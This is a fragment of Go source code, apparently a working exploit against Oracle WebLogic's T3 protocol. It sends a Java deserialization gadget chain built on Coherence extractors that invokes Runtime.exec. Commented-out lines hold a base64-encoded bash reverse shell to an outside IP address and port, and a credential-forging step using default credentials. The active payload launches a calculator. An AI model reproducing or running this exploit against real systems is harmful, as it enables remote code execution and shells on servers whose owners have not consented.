	//payload := []byte("\xac\xed\x00\x05\x73\x72\x00\x17\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x50\x72\x69\x6f\x72\x69\x74\x79\x51\x75\x65\x75\x65\x94\xda\x30\xb4\xfb\x3f\x82\xb1\x03\x00\x02\x49\x00\x04\x73\x69\x7a\x65\x4c\x00\x0a\x63\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\x3b\x78\x70\x00\x00\x00\x02\x73\x72\x00\x30\x63\x6f\x6d\x2e\x74\x61\x6e\x67\x6f\x73\x6f\x6c\x2e\x75\x74\x69\x6c\x2e\x63\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\x2e\x45\x78\x74\x72\x61\x63\x74\x6f\x72\x43\x6f\x6d\x70\x61\x72\x61\x74\x6f\x72\xc7\xad\x6d\x3a\x67\x6f\x3c\x18\x02\x00\x01\x4c\x00\x0b\x6d\x5f\x65\x78\x74\x72\x61\x63\x74\x6f\x72\x74\x00\x22\x4c\x63\x6f\x6d\x2f\x74\x61\x6e\x67\x6f\x73\x6f\x6c\x2f\x75\x74\x69\x6c\x2f\x56\x61\x6c\x75\x65\x45\x78\x74\x72\x61\x63\x74\x6f\x72\x3b\x78\x70\x73\x72\x00\x2c\x63\x6f\x6d\x2e\x74\x61\x6e\x67\x6f\x73\x6f\x6c\x2e\x75\x74\x69\x6c\x2e\x65\x78\x74\x72\x61\x63\x74\x6f\x72\x2e\x43\x68\x61\x69\x6e\x65\x64\x45\x78\x74\x72\x61\x63\x74\x6f\x72\x88\x9f\x81\xb0\x94\x5d\x5b\x7f\x02\x00\x00\x78\x72\x00\x36\x63\x6f\x6d\x2e\x74\x61\x6e\x67\x6f\x73\x6f\x6c\x2e\x75\x74\x69\x6c\x2e\x65\x78\x74\x72\x61\x63\x74\x6f\x72\x2e\x41\x62\x73\x74\x72\x61\x63\x74\x43\x6f\x6d\x70\x6f\x73\x69\x74\x65\x45\x78\x74\x72\x61\x63\x74\x6f\x72\x08\x6b\x3d\x8c\x05\x69\x0f\x44\x02\x00\x01\x5b\x00\x0c\x6d\x5f\x61\x45\x78\x74\x72\x61\x63\x74\x6f\x72\x74\x00\x23\x5b\x4c\x63\x6f\x6d\x2f\x74\x61\x6e\x67\x6f\x73\x6f\x6c\x2f\x75\x74\x69\x6c\x2f\x56\x61\x6c\x75\x65\x45\x78\x74\x72\x61\x63\x74\x6f\x72\x3b\x78\x72\x00\x2d\x63\x6f\x6d\x2e\x74\x61\x6e\x67\x6f\x73\x6f\x6c\x2e\x75\x74\x69\x6c\x2e\x65\x78\x74\x72\x61\x63\x74\x6f\x72\x2e\x41\x62\x73\x74\x72\x61\x63\x74\x45\x78\x74\x72\x61\x63\x74\x6f\x72\x65\x81\x95\x30\x3e\x72\x38\x21\x02\x00\x01\x49\x00\x09\x6d\x5f\x6e\x54\x61\x72\x67\x65\x74\x78\x70\x00\x00\x00\x00\x75\x72\x00\x23\x5b\x4c\x63\x6f\x6d\x2e\x74\x61\x6e\x67\x6f\x73\x6f\x6c\x2e\x75\x74\x69\x6c\x2e\x56\x61\x6c\x75\x65\x45\x78\x74\x72\x61\x63\x74\x6f\x72\x3b\x22\x46\x20\x47\x35\xc4\xa0\xfe\x02\x00\x00\x78\x70\x00\x00\x00\x03\x73\x72\x00\x2f\x63\x6f\x6d\x2e\x74\x61\x6e\x67\x6f\x73\x6f\x6c\x2e\x75\x74\x69\x6c\x2e\x65\x78\x74\x72\x61\x63\x74\x6f\x72\x2e\x52\x65\x66\x6c\x65\x63\x74\x69\x6f\x6e\x45\x78\x74\x72\x61\x63\x74\x6f\x72\xee\x7a\xe9\x95\xc0\x2f\xb4\xa2\x02\x00\x02\x5b\x00\x09\x6d\x5f\x61\x6f\x50\x61\x72\x61\x6d\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x09\x6d\x5f\x73\x4d\x65\x74\x68\x6f\x64\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x71\x00\x7e\x00\x09\x00\x00\x00\x00\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x02\x74\x00\x0a\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x75\x72\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73\x3b\xab\x16\xd7\xae\xcb\xcd\x5a\x99\x02\x00\x00\x78\x70\x00\x00\x00\x00\x74\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x73\x71\x00\x7e\x00\x0d\x00\x00\x00\x00\x75\x71\x00\x7e\x00\x11\x00\x00\x00\x02\x70\x75\x71\x00\x7e\x00\x11\x00\x00\x00\x00\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x0d\x00\x00\x00\x00\x75\x71\x00\x7e\x00\x11\x00\x00\x00\x01\x74\x00\x61\x62\x61\x73\x68\x20\x2d\x63\x20\x7b\x65\x63\x68\x6f\x2c\x59\x6d\x46\x7a\x61\x43\x41\x74\x61\x53\x41\x2b\x4a\x69\x41\x76\x5a\x47\x56\x32\x4c\x33\x52\x6a\x63\x43\x38\x30\x4e\x79\x34\x78\x4d\x44\x51\x75\x4d\x6a\x49\x35\x4c\x6a\x49\x7a\x4d\x69\x38\x35\x4d\x44\x6b\x78\x49\x44\x41\x2b\x4a\x6a\x45\x3d\x7d\x7c\x7b\x62\x61\x73\x65\x36\x34\x2c\x2d\x64\x7d\x7c\x7b\x62\x61\x73\x68\x2c\x2d\x69\x7d\x74\x00\x04\x65\x78\x65\x63\x77\x04\x00\x00\x00\x03\x76\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x52\x75\x6e\x74\x69\x6d\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x74\x00\x01\x31\x78")
	//payload := genPayload("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDQuMjI5LjIzMi85MDkxIDA+JjE=}|{base64,-d}|{bash,-i}")
	payload := genPayload("calc")
	//ioutil.WriteFile("pgopayload.ser", payload, 0666)
	//authenticatedUser := []byte("\xac\xed\x00\x05\x73\x72\x00\x30\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x73\x65\x63\x75\x72\x69\x74\x79\x2e\x61\x63\x6c\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x65\x64\x55\x73\x65\x72\x5c\xf8\xe9\x68\x4f\x73\xeb\x7b\x02\x00\x07\x49\x00\x09\x6c\x6f\x63\x61\x6c\x50\x6f\x72\x74\x42\x00\x03\x71\x6f\x73\x4a\x00\x09\x74\x69\x6d\x65\x53\x74\x61\x6d\x70\x4c\x00\x0b\x69\x6e\x65\x74\x41\x64\x64\x72\x65\x73\x73\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x6e\x65\x74\x2f\x49\x6e\x65\x74\x41\x64\x64\x72\x65\x73\x73\x3b\x4c\x00\x0c\x6c\x6f\x63\x61\x6c\x41\x64\x64\x72\x65\x73\x73\x71\x00\x7e\x00\x01\x4c\x00\x04\x6e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x09\x73\x69\x67\x6e\x61\x74\x75\x72\x65\x74\x00\x02\x5b\x42\x78\x70\xff\xff\xff\xff\x65\x00\x00\x01\x80\x27\x04\x7f\xf5\x70\x70\x74\x00\x08\x77\x65\x62\x6c\x6f\x67\x69\x63\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x00\x10\x31\x4e\x7f\x43\x3b\xd0\x3a\xad\x79\x88\x1c\xc9\x12\x3e\xaa\x2c")
	//authenticatedUser := genAuth("t3", "welcome1")
	//srcJVMID := []byte("\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1c\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x09\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x83\xb5\x79\x52\x00\x00\x00\x00\x78")
	//dstJVMID := []byte("\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x11\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x78")
	header := "t3 7.0.0.0\nAS:10\nHL:19\n\n"
	//header := "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n"
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Printf("conn server failed, err:%v\n", err)
		return
	}
	conn.Write([]byte(header))
	rd := bufio.NewReader(conn)
	//byt := make([]byte, 1024)
	var byt []byte
	buf := bytes.NewBuffer(byt)
	t := 0
	for {
		b, _ := rd.ReadByte()
		if b == 10 {
			t += 1
			if t == 3 {
				break
			}
		}
		buf.WriteByte(b)
	}

	fmt.Println(string(buf.Bytes()))

	cmd := "\x08"
	qos := "\x65"
	flags := "\x01"
	responseId := "\xff\xff\xff\xff"
	invokableId := "\xff\xff\xff\xff"
	abbrevOffset := "\x00\x00\x00\x00"
	//countLength := "\x01"
	//capacityLength := "\xfe\x01\x00" //必须大于上面设置的AS值
	capacityLength := "\x10"
	readObjectType := "\x00" //00 object deserial 01 ascii
	data := cmd + qos + flags + responseId + invokableId + abbrevOffset
	data += "\x04"
	writeObj := func(p []byte) {
		data += (capacityLength + readObjectType)
		data += string(p)
	}
	writeObj(payload)
	//writeObj(authenticatedUser)
	//writeObj(srcJVMID)
	//writeObj(dstJVMID)
	headers := []byte(data)
	l := len(headers) + 4
	bl := yserx.IntTo4Bytes(l)
	req := append(bl, headers...)
	//ioutil.WriteFile("a.d", req, 0666)
	conn.Write(req)
	time.Sleep(10 * time.Second)
}
